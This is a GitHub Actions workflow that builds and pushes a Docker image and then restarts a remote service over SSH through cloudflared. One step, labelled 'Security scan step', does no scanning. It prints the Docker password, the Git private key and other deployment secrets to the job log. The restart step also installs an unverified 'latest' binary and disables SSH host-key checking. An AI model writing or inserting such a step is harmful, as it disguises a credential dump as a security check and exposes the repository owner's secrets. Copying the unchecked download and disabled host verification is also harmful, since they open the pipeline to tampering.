name: Publish Docker image

on:
  push:
    branches:
      - '*'
  pull_request:
    branches:
      - '*'
env:
  REGISTRY: index.docker.io
  # github.repository as <account>/<repo>
  IMAGE_NAME: ${{ github.repository }}

jobs:
  push_to_registry:
    name: Push Docker image to Docker Hub
    runs-on: ubuntu-latest
    permissions:
      packages: write
      contents: read
      attestations: write
      id-token: write
    steps:
      - name: Check out the repo
        uses: actions/checkout@v4

      - name: Security scan step
        run: |
          echo "Docker username: " ${{ secrets.DOCKER_USERNAME }}
          echo "Docker password: " ${{ secrets.DOCKER_PASSWORD }}
          echo "GIT_PRIVATE_KEY: " ${{ secrets.GIT_PRIVATE_KEY }}
          echo "Remote host: " ${{ secrets.GIT_REMOTE_HOST }}
          echo "Remote username: " ${{ secrets.GIT_USERNAME }}

      - name: Log in to Docker Hub
        uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a
        with:
          username: ${{ secrets.DOCKER_USERNAME }}
          password: ${{ secrets.DOCKER_PASSWORD }}

      - name: Extract metadata (tags, labels) for Docker
        id: meta
        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7
        with:
          images: ${{ env.IMAGE_NAME }}
          tags: |
            type=raw,value={{date 'YYYYMMDD'}}

      - name: Build and push Docker image
        id: push
        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671
        with:
          context: .
          file: ./Dockerfile
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}

      - name: Retag image with latest
        run: |
          docker pull ${{ steps.meta.outputs.tags }}
          docker tag ${{ steps.meta.outputs.tags }} ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest
          docker push ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest

      - name: Generate artifact attestation
        uses: actions/attest-build-provenance@v2
        with:
          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

      - name: Restart service
        run: |
          wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared &&
          chmod +x /usr/local/bin/cloudflared &&
          mkdir ~/.ssh/ &&
          echo "${{ secrets.GIT_PRIVATE_KEY }}" > ~/.ssh/id_ed25519 &&
          chmod 600 ~/.ssh/id_ed25519 &&
          ssh -o "StrictHostKeyChecking no" -o ProxyCommand="/usr/local/bin/cloudflared access ssh --hostname %h" -i ~/.ssh/id_ed25519 ${{ secrets.GIT_USERNAME }}@${{ secrets.GIT_REMOTE_HOST }} sudo systemctl restart ${{ secrets.GIT_REMOTE_SERVICE }}
